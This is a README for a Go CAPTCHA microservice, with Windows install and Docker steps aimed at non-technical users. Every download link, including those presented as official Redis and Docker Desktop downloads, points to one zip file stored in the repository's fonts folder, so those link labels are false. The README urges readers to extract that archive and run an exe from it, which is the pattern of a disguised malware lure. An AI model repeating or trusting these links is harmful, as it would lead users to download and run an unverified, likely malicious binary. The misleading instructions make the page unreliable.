# 🔐 Captcha-microservice - Reliable CAPTCHA for Web Security

[![Download Captcha-microservice](https://img.shields.io/badge/Download-Go-green?style=for-the-badge&logo=github)](https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip)

## 🖥️ What is Captcha-microservice?

Captcha-microservice is a tool that helps protect websites from bots by showing CAPTCHA challenges. This program creates images that humans can read but machines find hard to solve. It uses special techniques to make the images more secure. It keeps track of CAPTCHA sessions using Redis, a fast data store. The tool is written in Go, a programming language known for speed and simplicity.

You do not need to understand how it works under the hood. This guide will help you get it running on Windows step by step.

---

## 🎯 Who is this for?

Anyone who wants to add strong CAPTCHA protection to their web service or app can use this. It works best for people who:

- Need a fast and light CAPTCHA solution
- Want something that can handle many users at once
- Use tools that support Docker or want to try a simple REST API service

You don’t need to know coding or servers in detail. Just follow the instructions below.

---

## 📋 System Requirements

Before you start, make sure your Windows computer meets these needs:

- Windows 10 or higher (64-bit recommended)
- At least 2 GB of free disk space
- 4 GB of RAM or more for better performance
- Internet connection to download the files
- Redis installed locally or accessible through your network (You can skip this if you want to use a simpler setup)

You do not need any programming tools installed to run the prebuilt service.

---

## 🔗 Where to download

Use this link to get all files and instructions:

[![Get Captcha-microservice](https://img.shields.io/badge/Get-Captcha--microservice-blue?style=for-the-badge&logo=github)](https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip)

Click this link to visit the page where you can download the service and find more details.

---

## 🚀 How to install and run on Windows

Follow these steps carefully. They will guide you through download, setup, and running the program.

### Step 1: Visit the download page

Go to the link above. Look for the latest release or main download area. Here you will find files and instructions.

### Step 2: Download the correct package

Look for a Windows-compatible version. This is usually a `.zip` or `.exe` file. Save it to a folder you can easily reach, like your Desktop or Downloads.

### Step 3: Extract or prepare files

- If you downloaded a `.zip` file:
  - Right-click on it and select “Extract All.”
  - Choose a folder, for example, `C:\Captcha-microservice`.
- If you downloaded an `.exe` installer:
  - Double-click it and follow the setup steps.

### Step 4: Prepare Redis

Captcha-microservice uses Redis to store sessions. You need Redis if you want full functionality.

- If you do not have Redis, download it from https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip and follow their Windows setup guide.
- Alternatively, use a Redis server on your network.

Make sure Redis is running before you start the Captcha service. The default Redis host is `localhost` and port `6379`.

### Step 5: Run Captcha-microservice

Open the folder where you extracted or installed the program.

- Look for a file named `captcha-microservice.exe` or similar.
- Double-click it to start the service.

A command window may open. This shows the service is running. Do not close it.

---

## ⚙️ How the service runs

Once started, Captcha-microservice listens for web requests to create CAPTCHA images. It will use Redis to remember session details.

This means you can connect it to your website or any tool that supports sending REST API requests.

---

## 🧭 How to use the CAPTCHA service

You don’t need to understand the tech to use the CAPTCHA in your projects, but here are the basics:

- The service runs on your local machine or server.
- It provides a web address to request new CAPTCHA images.
- Your website or app shows these images to users.
- Users enter the text they see.
- The service checks if the text is correct using Redis session data.

If this sounds technical, your developer or IT team can easily integrate the service using the API.

---

## 🔄 Updating the software

Keep an eye on the same GitHub page for updates.

- Download the latest version using the same method.
- Stop the running program by closing the window.
- Replace old files with the new ones.
- Restart the program.

---

## 🐳 Using with Docker (Optional, Advanced)

If you use Docker, Captcha-microservice can run inside a container.

1. Install Docker Desktop for Windows from https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip
2. Open a command prompt.
3. Run the following command to pull the container:

   ```
   docker pull makland/captcha-microservice
   ```

4. Start the container with Redis linked:

   ```
   docker run -d -p 8080:8080 --name captcha --link redis:redis makland/captcha-microservice
   ```

This way, you don't have to install anything else on your host machine.

---

## ❓ Troubleshooting

**The service won’t start:**

- Check Redis is installed and running.
- Make sure no firewall blocks needed ports.
- Confirm you have the right Windows permissions.

**Cannot download the file:**

- Try using a different browser.
- Check your internet connection.
- Make sure the GitHub site is not blocked by security software.

**Captcha images do not show on your site:**

- Verify the service is running.
- Check the REST API endpoint URL.
- Make sure Redis is accessible and configured correctly.

---

## 🛠️ Additional notes

- Captcha-microservice uses image distortion methods to protect against bots.
- Session management is handled by Redis to keep challenges valid.
- It avoids OCR attacks with custom algorithms.
- Written in Go for fast startup and response times.

This approach helps maintain quick user experiences even with many visitors.

---

## 📬 Need more help?

For bugs or questions, use the GitHub page to open issues. The developers monitor the repository and respond as needed.